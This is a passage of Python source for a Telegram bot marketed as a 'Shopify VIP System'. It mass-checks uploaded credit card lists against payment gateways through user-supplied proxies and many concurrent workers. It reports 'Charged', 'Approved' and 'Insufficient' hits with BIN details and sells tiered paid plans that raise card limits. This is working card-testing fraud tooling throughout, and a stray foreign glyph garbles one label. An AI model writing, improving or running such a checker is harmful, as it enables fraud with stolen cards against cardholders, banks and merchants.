                [Button.inline(f"🟢 𝘊𝘩𝘢𝘳𝘨𝘦𝘥 ⇾ {charged}", b"none"), Button.inline(f"⚡ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 ⇾ {approved}", b"none")],
                [Button.inline(f"🟡 𝘐𝘯𝘴𝘶𝘧𝘧𝘪𝘤𝘪𝘦𝘯𝘵 ⇾ {insufficient}", b"none"), Button.inline(f"🔴 𝘋𝘦𝘤𝘭𝘪𝘯𝘦𝘥 ⇾ {declined}", b"none")],
                [Button.inline(f"⚠️ 𝘌𝘳𝘳𝘰𝘳𝘴 ⇾ {errors}", b"none"), Button.inline(f"📊 𝘛𝘰𝘵𝘢𝘭 ⇾ {checked} / {total}", b"none")],
                [Button.inline("🛑 𝘚𝘵𝘰𝘱 𝘗𝘳𝘰𝘤𝘦𝘴𝘴", f"{stop_prefix}:{uid}".encode())]
            ]
            try: await styled_edit(msg_obj, f"⦗ ⚡ ⦘ 𝘚𝘦𝘴𝘴𝘪𝘰𝘯 𝘈𝘤𝘵𝘪𝘷𝘦...\n\n├ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ⇾ <code>{gate_name}</code>\n╰ 𝘛𝘩𝘳𝘦𝘢𝘥𝘴 ⇾ <code>{WORKERS}</code>", buttons=kb)
            except: pass
            
    updater_task = asyncio.create_task(dashboard_updater())
    queue = asyncio.Queue()
    for c in cards: queue.put_nowait(c)

    royal_status_map = {
        'Charged': '𝘊𝘩𝘢𝘳𝘨𝘦𝘥 🟢', 'Approved': '𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 ⚡', 'Insufficient': '𝘐𝘯𝘴𝘶𝘧𝘧𝘪𝘤𝘪𝘦𝘯𝘵 🟡',
        'Site Error': '𝘌𝘳𝘳𝘰𝘳 ⚠️', 'Dead': '𝘋𝘦𝘤𝘭𝘪𝘯𝘦𝘥 🔴'
    }

    async def worker():
        nonlocal checked, charged, approved, insufficient, declined, errors, lcd
        while not queue.empty() and not is_stopped():
            try: card = queue.get_nowait()
            except asyncio.QueueEmpty: break
            
            try:
                card_st = time.time()
                async with user_sem:
                    res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, max_retries=3)
                card_el = time.time() - card_st
                
                status = res.get('status', 'Dead')
                message = res.get('message', 'Error')
                price = res.get('price', '-')
                
                checked += 1
                royal_status = royal_status_map.get(status, '𝘌𝘳𝘳𝘰𝘳 ⚠️')
                lcd = f"{card[:15]}... ⇾ {royal_status}"
                
                if status == 'Charged':
                    charged += 1
                    asyncio.create_task(_send_mass_hit(card, "Charged", message, price, gate_name, uid, card_el))
                elif status == 'Approved':
                    approved += 1
                    asyncio.create_task(_send_mass_hit(card, "Approved", message, price, gate_name, uid, card_el))
                elif status == 'Insufficient':
                    insufficient += 1
                    asyncio.create_task(_send_mass_hit(card, "Insufficient", message, price, gate_name, uid, card_el))
                elif status == 'Site Error': errors += 1
                else: declined += 1
                    
                queue.task_done()
            except Exception as e:
                queue.task_done()
                errors += 1
                checked += 1

    workers_tasks = [asyncio.create_task(worker()) for _ in range(WORKERS)]
    process_store[uid]["tasks"] = workers_tasks
    await asyncio.gather(*workers_tasks, return_exceptions=True)
    updater_task.cancel()
    
    el = int(time.time() - st); h, m, s = el // 3600, (el % 3600) // 60, el % 60
    
    final_header = "⦗ 🛑 ⦘ 𝘗𝘳𝘰𝘤𝘦𝘴𝘴 𝘚𝘵𝘰𝘱𝘱𝘦𝘥" if is_stopped() else "⦗ ✨ ⦘ 𝘗𝘳𝘰𝘤𝘦𝘴𝘴 𝘊𝘰𝘮𝘱𝘭𝘦𝘵𝘦𝘥"
    
    fkb = [
        [Button.inline(f"🟢 𝘊𝘩𝘢𝘳𝘨𝘦𝘥 ⇾ {charged}", b"none"), Button.inline(f"⚡ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 ⇾ {approved}", b"none")],
        [Button.inline(f"🟡 𝘐𝘯𝘴𝘶𝘧𝘧𝘪𝘤𝘪𝘦𝘯𝘵 ⇾ {insufficient}", b"none"), Button.inline(f"🔴 𝘋𝘦𝘤𝘭𝘪𝘯𝘦𝘥 ⇾ {declined}", b"none")],
        [Button.inline(f"📊 𝘛𝘰𝘵ষ্ঠ 𝘊𝘩𝘦𝘤𝘬𝘦𝘥 ⇾ {checked} / {total}", b"none")],
        [Button.inline(f"⏱ 𝘛𝘪𝘮𝘦 𝘛𝘢𝘬𝘦𝘯 ⇾ {h}𝘩 {m}𝘮 {s}𝘴", b"none")]
    ]
    try: await styled_edit(msg_obj, f"{final_header}\n\n├ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺: <code>{gate_name}</code>\n╰ 𝘚𝘦𝘴𝘴𝘪𝘰𝘯 𝘊𝘭𝘰𝘴𝘦𝘥. 𝘌𝘯𝘫𝘰𝘺 𝘺𝘰𝘶𝘳 𝘦𝘹𝘤𝘭𝘶𝘴𝘪𝘷𝘦 𝘩𝘪𝘵𝘴 𝘢𝘣𝘰𝘷𝘦 👑", buttons=fkb)
    except: pass
        
    process_store.pop(uid, None)
    await cleanup_user_http_session(uid, sem_type)

async def _send_mass_hit(card, status, message, price, gateway, uid, elapsed):
    await asyncio.sleep(HIT_DELAY)
    try:
        bi = await get_bin_info(card.split("|")[0])
        msg = format_card_result(status, card, gateway, message, price, bi, elapsed)
        
        gif_io = await fetch_random_gif()
        if gif_io:
            try: await styled_send(uid, msg, buttons=HIT_BUTTON, file=gif_io)
            except: await styled_send(uid, msg, buttons=HIT_BUTTON)
        else:
            await styled_send(uid, msg, buttons=HIT_BUTTON)
    except: pass

@client.on(events.CallbackQuery(pattern=rb"stop_chk:(\d+)"))
async def stop_chk_cb(event):
    puid = int(event.pattern_match.group(1).decode())
    if event.sender_id != puid and event.sender_id not in ADMIN_ID: return await event.answer("Not yours!", alert=True)
    proc = ACTIVE_MTXT_PROCESSES.get(puid)
    if not proc: return await event.answer("None active!", alert=True)
    if isinstance(proc, dict):
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    await event.answer("Stopping Process...", alert=True)

# ====================== FEEDBACK COMMAND ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]fb(?:\s+(.*))?'))
async def feedback_cmd(event):
    if not await force_join_check(event): return
    uid = event.sender_id
    text = event.pattern_match.group(1)
    
    if not text and not event.is_reply and not getattr(event.message, 'media', None):
        return await styled_reply(event, "⚠️ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘧𝘦𝘦𝘥𝘣𝘢𝘤𝘬 𝘵𝘦𝘹𝘵 𝘰𝘳 𝘳𝘦𝘱𝘭𝘺 𝘵𝘰 𝘢 𝘱𝘩𝘰𝘵𝘰/𝘮𝘦𝘴𝘴𝘢𝘨𝘦.")

    admin = ADMIN_ID[0] if ADMIN_ID else None
    if admin:
        try:
            await client_instance.forward_messages(admin, event.message)
            await client_instance.send_message(admin, f"📩 <b>𝗡𝗲𝘄 𝗙𝗲𝗲𝗱𝗯𝗮𝗰𝗸 𝗳𝗿𝗼𝗺:</b> <code>{uid}</code>", parse_mode="html")
        except: pass

    reply_text = "⦗ ✨ ⦘ 𝘠𝘰𝘶𝘳 𝘧𝘦𝘦𝘥𝘣𝘢𝘤𝘬 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘴𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘴𝘦𝘯𝘵 𝘵𝘰 𝘵𝘩𝘦 𝘰𝘸𝘯𝘦𝘳. 𝘛𝘩𝘢𝘯𝘬 𝘺𝘰𝘶 𝘧𝘰𝘳 𝘺𝘰𝘶𝘳 𝘴𝘶𝘱𝘱𝘰𝘳𝘵! 👑"
    gif_io = await fetch_random_gif()
    if gif_io:
        try: await styled_reply(event, reply_text, file=gif_io)
        except: await styled_reply(event, reply_text)
    else:
        await styled_reply(event, reply_text)

@client.on(events.CallbackQuery(data=b"check_joined"))
async def check_joined_cb(event):
    uid = event.sender_id
    if uid in ADMIN_ID: return await event.answer(f"✅ Admin Verification Complete!", alert=True)
    if await is_user_joined(uid):
        await mark_user_joined(uid)
        await event.answer(f"✅ Successfully Verified!", alert=True)
        try: await event.delete()
        except: pass
        await styled_send(event.chat_id, f"⦗ ✨ ⦘ 𝘞𝘦𝘭𝘤𝘰𝘮𝘦\n╰ 𝘚𝘦𝘯𝘥 /start 𝘵𝘰 𝘴𝘦𝘦 𝘤𝘰𝘮𝘮𝘢𝘯𝘥𝘴.")
    else: await event.answer(f"❌ You are not joined!", alert=True)

# ====================== PROXY COMMANDS ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]addpxy'))
async def add_proxy_cmd(event):
    try:
        if not await force_join_check(event): return
        
        lines = []
        if event.is_reply:
            rm = await event.get_reply_message()
            if rm.file:
                fp = await rm.download_media()
                if fp:
                    try:
                        async with aiofiles.open(fp, "r", encoding="utf-8") as f:
                            lines = [l.strip() for l in (await f.read()).splitlines() if l.strip()]
                        os.remove(fp)
                    except: pass
            elif rm.text: lines = [l.strip() for l in rm.text.splitlines() if l.strip()]
        else:
            p = event.raw_text.split(maxsplit=1)
            if len(p) == 2: lines = [l.strip() for l in p[1].splitlines() if l.strip()]
            else: return await styled_reply(event, "⚠️ 𝘚𝘺𝘯𝘵𝘢𝘹: <code>/addpxy ip:port:user:pass</code>")
        
        if not lines: return await styled_reply(event, "⚠️ 𝘕𝘰 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘧𝘰𝘶𝘯𝘥.")
        
        cc = await get_proxy_count(event.sender_id)
        if cc >= 100: return await styled_reply(event, "⚠️ 𝘓𝘪𝘮𝘪𝘵 𝟣𝟬𝟬/𝟣𝟬𝟬 𝘙𝘦𝘢𝘤𝘩𝘦𝘥. 𝘗𝘭𝘦𝘢𝘴𝘦 𝘳𝘦𝘮𝘰𝘷𝘦 𝘴𝘰𝘮𝘦 𝘧𝘪𝘳𝘴𝘵.")
        
        parsed = []
        for l in lines:
            pd = parse_proxy_format(l)
            if pd: parsed.append(pd)
        if not parsed: return await styled_reply(event, "⚠️ 𝘕𝘰 𝘷𝘢𝘭𝘪𝘥 𝘱𝘳𝘰𝘹𝘪𝘦𝘴.")
        parsed = parsed[:100-cc]
        
        tm = await styled_reply(event, f"⦗ ⚙️ ⦘ 𝘈𝘥𝘥𝘪𝘯𝘨 {len(parsed)} 𝘗𝘳𝘰𝘹𝘪𝘦𝘴...")
        added = 0
        for pd2 in parsed:
            await add_proxy_db(event.sender_id, pd2)
            added += 1
        await styled_edit(tm, f"✅ 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘈𝘥𝘥𝘦𝘥: <code>{added}</code> 𝘗𝘳𝘰𝘹𝘪𝘦𝘴")
    except Exception as e: await event.reply(f"⚠️ Error: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]proxy$'))
async def view_proxies(event):
    try:
        if not await force_join_check(event): return
        
        proxies = await get_all_user_proxies(event.sender_id)
        if not proxies: return await styled_reply(event, "⚠️ 𝘕𝘰 𝘗𝘳𝘰𝘹𝘪𝘦𝘴 𝘍𝘰𝘶𝘯𝘥.")
        
        text = f"⦗ 🛡️ ⦘ 𝘠𝘰𝘶𝘳 𝘗𝘳𝘰𝘹𝘪𝘦𝘴 ({len(proxies)}/100)\n\n"
        for i, p in enumerate(proxies[:30], 1): 
            text += f"<code>{i}.</code> <code>{p['ip']}:{p['port']}</code>\n"
        if len(proxies) > 30: text += f"\n<i>+{len(proxies)-30} 𝘮𝘰𝘳𝘦...</i>"
        text += f"\n\n╰ 𝘜𝘴𝘦 <code>/rmpxy all</code> 𝘵𝘰 𝘤𝘭𝘦𝘢𝘳."
        await styled_reply(event, text)
    except Exception as e: await event.reply(f"⚠️ Error: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmpxy'))
async def remove_proxy_cmd(event):
    try:
        if not await force_join_check(event): return
        
        proxies = await get_all_user_proxies(event.sender_id)
        if not proxies: return await styled_reply(event, "⚠️ 𝘕𝘰 𝘗𝘳𝘰𝘹𝘪𝘦𝘴 𝘍𝘰𝘶𝘯𝘥.")
        
        p = event.raw_text.split(maxsplit=1)
        if len(p) == 1: return await styled_reply(event, "⚠️ 𝘚𝘺𝘯𝘵𝘢𝘹: <code>/rmpxy index</code> 𝘰𝘳 <code>all</code>")
        
        arg = p[1].strip().lower()
        if arg == 'all':
            c = await clear_all_proxies(event.sender_id)
            return await styled_reply(event, f"✅ 𝘊𝘭𝘦𝘢𝘳𝘦𝘥 <code>{c}</code> 𝘗𝘳𝘰𝘹𝘪𝘦𝘴.")
        
        try:
            idx = int(arg) - 1
            if 0 <= idx < len(proxies):
                rm = await remove_proxy_by_index(event.sender_id, idx)
                await styled_reply(event, f"✅ 𝘙𝘦𝘮𝘰𝘷𝘦𝘥: <code>{rm['ip']}:{rm['port']}</code>")
            else: await styled_reply(event, "⚠️ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘐𝘯𝘥𝘦𝘹.")
        except: await styled_reply(event, "⚠️ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘐𝘯𝘥𝘦𝘹.")
    except Exception as e: await event.reply(f"⚠️ Error: {e}")

# ====================== UI / PLANS ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start(event):
    try:
        if not await force_join_check(event): return
        await ensure_user(event.sender_id)
        plan = await get_user_plan(event.sender_id)
        limit = get_cc_limit(plan, event.sender_id)
        
        text = f"""⦗ ⚡ ⦘ 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 𝘝𝘐𝘗 𝘚𝘺𝘴𝘵𝘦𝘮

├ ⦗ 💳 ⦘ 𝘊𝘩𝘦𝘤𝘬𝘪𝘯𝘨
│ ╰ 𝘚𝘦𝘯𝘥 𝘢 𝘧𝘪𝘭𝘦 𝘵𝘰 𝘢𝘶𝘵𝘰-𝘴𝘵𝘢𝘳𝘵 𝘔𝘢𝘴𝘴 𝘊𝘩𝘦𝘤𝘬

├ ⦗ ⚙️ ⦘ 𝘗𝘳𝘰𝘹𝘺 𝘔𝘢𝘯𝘢𝘨𝘦𝘳
│ ├ /addpxy ⇾ 𝘈𝘥𝘥 𝘗𝘳𝘰𝘹𝘪𝘦𝘴
│ ├ /proxy ⇾ 𝘝𝘪𝘦𝘸 𝘗𝘳𝘰𝘹𝘪𝘦𝘴
│ ╰ /rmpxy ⇾ 𝘙𝘦𝘮𝘰𝘷𝘦 𝘗𝘳𝘰𝘹𝘪𝘦𝘴

╰ ⦗ 👤 ⦘ 𝘈𝘤𝘤𝘰𝘶𝘯𝘵
  ├ /info ⇾ 𝘠𝘰𝘶𝘳 𝘗𝘳𝘰𝘧𝘪𝘭𝘦
  ├ /fb ⇾ 𝘚𝘦𝘯𝘥 𝘍𝘦𝘦𝘥𝘣𝘢𝘤𝘬
  ╰ /plan ⇾ 𝘝𝘪𝘦𝘸 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯𝘴

⦗ 💎 ⦘ 𝘠𝘰𝘶𝘳 𝘗𝘭𝘢𝘯 ⇾ <code>{plan.title() if plan else 'Bronze'} ({limit} 𝘓𝘪𝘮𝘪𝘵)</code>"""
        
        kb = [
            [Button.inline("⦗ 💎 ⦘ 𝘝𝘪𝘦𝘸 𝘗𝘭𝘢𝘯𝘴", b"show_plans")],
            [Button.url("⦗ 📢 ⦘ 𝘊𝘩𝘢𝘯𝘯𝘦𝘭", JOIN_CHANNEL_LINK), Button.url("⦗ 💬 ⦘ 𝘎𝘳𝘰𝘶𝘱", JOIN_GROUP_LINK)]
        ]
        
        gif_io = await fetch_random_gif(WELCOME_GIF)
        if gif_io:
            try: await styled_reply(event, text, buttons=kb, file=gif_io)
            except Exception: await styled_reply(event, text, buttons=kb)
        else:
            await styled_reply(event, text, buttons=kb)
            
    except Exception as e: await event.reply(f"⚠️ Error in /start: {e}")

@client.on(events.CallbackQuery(data=b"back_start"))
async def back_start_cb(event):
    uid = event.sender_id
    plan = await get_user_plan(uid)
    limit = get_cc_limit(plan, uid)
    
    text = f"""⦗ ⚡ ⦘ 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 𝘝𝘐𝘗 𝘚𝘺𝘴𝘵𝘦𝘮

├ ⦗ 💳 ⦘ 𝘊𝘩𝘦𝘤𝘬𝘪𝘯𝘨
│ ╰ 𝘚𝘦𝘯𝘥 𝘢 𝘧𝘪𝘭𝘦 𝘵𝘰 𝘢𝘶𝘵𝘰-𝘴𝘵𝘢𝘳𝘵 𝘔𝘢𝘴𝘴 𝘊𝘩𝘦𝘤𝘬

├ ⦗ ⚙️ ⦘ 𝘗𝘳𝘰𝘹𝘺 𝘔𝘢𝘯𝘢𝘨𝘦𝘳
│ ├ /addpxy ⇾ 𝘈𝘥𝘥 𝘗𝘳𝘰𝘹𝘪𝘦𝘴
│ ├ /proxy ⇾ 𝘝𝘪𝘦𝘸 𝘗𝘳𝘰𝘹𝘪𝘦𝘴
│ ╰ /rmpxy ⇾ 𝘙𝘦𝘮𝘰𝘷𝘦 𝘗𝘳𝘰𝘹𝘪𝘦𝘴

╰ ⦗ 👤 ⦘ 𝘈𝘤𝘤𝘰𝘶𝘯𝘵
  ├ /info ⇾ 𝘠𝘰𝘶𝘳 𝘗𝘳𝘰𝘧𝘪𝘭𝘦
  ├ /fb ⇾ 𝘚𝘦𝘯𝘥 𝘍𝘦𝘦𝘥𝘣𝘢𝘤𝘬
  ╰ /plan ⇾ 𝘝𝘪𝘦𝘸 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯𝘴

⦗ 💎 ⦘ 𝘠𝘰𝘶𝘳 𝘗𝘭𝘢𝘯 ⇾ <code>{plan.title() if plan else 'Bronze'} ({limit} 𝘓𝘪𝘮𝘪𝘵)</code>"""
        
    kb = [
        [Button.inline("⦗ 💎 ⦘ 𝘝𝘪𝘦𝘸 𝘗𝘭𝘢𝘯𝘴", b"show_plans")],
        [Button.url("⦗ 📢 ⦘ 𝘊𝘩𝘢𝘯𝘯𝘦𝘭", JOIN_CHANNEL_LINK), Button.url("⦗ 💬 ⦘ 𝘎𝘳𝘰𝘶𝘱", JOIN_GROUP_LINK)]
    ]
    await styled_edit(event, text, buttons=kb)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]info$'))
async def info_cmd(event):
    if not await force_join_check(event): return
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    status = "Active" if is_paid_plan(plan) else "Free"
    
    text = f"""⦗ 👤 ⦘ 𝘗𝘳𝘰𝘧𝘪𝘭𝘦 𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘵𝘪𝘰𝘯

├ 𝘐𝘋: <code>{event.sender_id}</code>
├ 𝘚𝘵𝘢𝘵𝘶𝘴: <code>{status}</code>
├ 𝘗𝘭𝘢𝘯: <code>{plan.title() if plan else 'Bronze'}</code>
╰ 𝘓𝘪𝘮𝘪𝘵: <code>{limit} 𝘊𝘊𝘴</code>"""
    await styled_reply(event, text)

@client.on(events.CallbackQuery(data=b"show_plans"))
async def plans_cb(event):
    await event.answer()
    cp = await get_user_plan(event.sender_id)
    plans_text = f"⦗ 💎 ⦘ 𝘝𝘐𝘗 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯 𝘗𝘭𝘢𝘯𝘴\n\n"
    for pid, pi in PLANS.items():
        plans_text += f"├ {pi['emoji']} {pi['name']}\n│ ├ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{pi['duration_days']} 𝘋𝘢𝘺𝘴</code>\n│ ╰ 𝘗𝘳𝘪𝘤𝘦: <code>{pi['price']}</code>\n│\n"
    
    plans_text += f"╰ ⦗ 👤 ⦘ 𝘠𝘰𝘶𝘳 𝘊𝘶𝘳𝘳𝘦𝘯𝘵 𝘗𝘭𝘢𝘯 ⇾ <code>{cp.title() if cp else 'Bronze'}</code>"
    kb = [
        [Button.url("⦗ 👑 ⦘ 𝘊𝘰𝘯𝘵𝘢𝘤𝘵 𝘖𝘸𝘯𝘦𝘳 𝘛𝘰 𝘜𝘱𝘨𝘳𝘢𝘥𝘦", "https://t.me/Dddadddyttt")],
        [Button.inline("⦗ 🔙 ⦘ 𝘉𝘢𝘤𝘬", b"back_start")]
    ]
    await styled_edit(event, plans_text, buttons=kb)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan$'))
async def show_plans(event):
    if not await force_join_check(event): return
    cp = await get_user_plan(event.sender_id)
    plans_text = f"⦗ 💎 ⦘ 𝘝𝘐𝘗 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯 𝘗𝘭𝘢𝘯𝘴\n\n"
    for pid, pi in PLANS.items():
        plans_text += f"├ {pi['emoji']} {pi['name']}\n│ ├ 𝘋𝘶𝗿𝗮𝘵𝘪𝘰𝘯: <code>{pi['duration_days']} 𝘋𝘢𝘺𝘴</code>\n│ ╰ 𝘗𝘳𝘪𝘤𝘦: <code>{pi['price']}</code>\n│\n"
    
    plans_text += f"╰ ⦗ 👤 ⦘ 𝘠𝘰𝘶𝘳 𝘊𝘶𝘳𝘳𝘦𝘯𝘵 𝘗𝘭𝘢𝘯 ⇾ <code>{cp.title() if cp else 'Bronze'}</code>"
    kb = [
        [Button.url("⦗ 👑 ⦘ 𝘊𝘰𝘯𝘵𝘢𝘤𝘵 𝘖𝘸𝘯𝘦𝘳 𝘛𝘰 𝘜𝘱𝘨𝘳𝘢𝘥𝘦", "https://t.me/Dddadddyttt")],
        [Button.inline("⦗ 🔙 ⦘ 𝘉𝘢𝘤𝘬", b"back_start")]
    ]
    await styled_reply(event, plans_text, buttons=kb)

# ====================== ADMIN COMMANDS ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan1\b'))
async def plan1_cmd(event): await _handle_plan_assign(event, "plan1")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan2\b'))
async def plan2_cmd(event): await _handle_plan_assign(event, "plan2")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan3\b'))
async def plan3_cmd(event): await _handle_plan_assign(event, "plan3")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan4\b'))
async def plan4_cmd(event): await _handle_plan_assign(event, "plan4")

async def _handle_plan_assign(event, plan_key):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 2: return await styled_reply(event, f"⚠️ 𝘚𝘺𝘯𝘵𝘢𝘹: <code>/{plan_key} user_id</code>")
    try: target_uid = int(parts[1])
    except: return await styled_reply(event, "⚠️ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘐𝘋")
    
    pi = PLANS[plan_key]
    await set_user_plan(target_uid, pi["tier"], pi["duration_days"])
    
    expiry_date = (datetime.now() + timedelta(days=pi["duration_days"])).strftime('%Y-%m-%d %H:%M:%S')
    
    admin_msg = f"✅ 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘶𝘱𝘨𝘳𝘢𝘥𝘦𝘥 𝘶𝘴𝘦𝘳 <code>{target_uid}</code> 𝘵𝘰 {pi['emoji']} {pi['name']}"
    await styled_reply(event, admin_msg)
    
    user_msg = f"""⦗ 👑 ⦘ 𝘝𝘐𝘗 𝘜𝘱𝘨𝘳𝘢𝘥𝘦 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭!

🎉 𝘊𝘰𝘯𝘨𝘳𝘢𝘵𝘶𝘭𝘢𝘵𝘪𝘰𝘯𝘴! 𝘠𝘰𝘶𝘳 𝘢𝘤𝘤𝘰𝘶𝘯𝘵 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘶𝘱𝘨𝘳𝘢𝘥𝘦𝘥.

⦗ 💎 ⦘ 𝘗𝘭𝘢𝘯 𝘋𝘦𝘵𝘢𝘪𝘭𝘴 ⇾
├ 𝘗𝘭𝘢𝘯: {pi['emoji']} <code>{pi['name']}</code>
├ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{pi['duration_days']} 𝘋𝘢𝘺𝘴</code>
├ 𝘔𝘢𝘴𝘴 𝘓𝘪𝘮𝘪𝘵: <code>{get_cc_limit(pi['tier'])} 𝘊𝘊𝘴</code>
╰ 𝘌𝘹𝘱𝘪𝘳𝘦𝘴 𝘖𝘯: <code>{expiry_date}</code>

⦗ 🚀 ⦘ 𝘌𝘯𝘫𝘰𝘺 𝘶𝘭𝘵𝘳𝘢-𝘧𝘢𝘴𝘵 𝘤𝘩𝘦𝘤𝘬𝘪𝘯𝘨 𝘸𝘪𝘵𝘩 <code>{WORKERS}</code> 𝘞𝘰𝘳𝘬𝘦𝘳𝘴!
𝘚𝘦𝘯𝘥 𝘢 𝘧𝘪𝘭𝘦 𝘯𝘰𝘸 𝘵𝘰 𝘴𝘵𝘢𝘳𝘵 𝘵𝘩𝘦 𝘱𝘳𝘰𝘤𝘦𝘴𝘴."""

    gif_io = await fetch_random_gif()
    if gif_io:
        try: await styled_send(target_uid, user_msg, file=gif_io)
        except Exception as e:
            logging.info(f"Could not send upgrade message with GIF to {target_uid}: {e}")
            try: await styled_send(target_uid, user_msg)
            except: pass
    else:
        try: await styled_send(target_uid, user_msg)
        except: pass

# ====================== MAIN LOOP ======================
async def main():
    global client_instance
    client_instance = client
    await init_db()
    
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=true"
            async with session.get(url) as resp: await resp.json()
    except: pass

    await get_github_sites()

    while True:
        try:
            await client.start(bot_token=BOT_TOKEN)
            print("✅ VIP BOT STARTED WITH ZERO ERRORS!")
            await client.run_until_disconnected()
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds + 5)
        except Exception as e:
            await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(main())
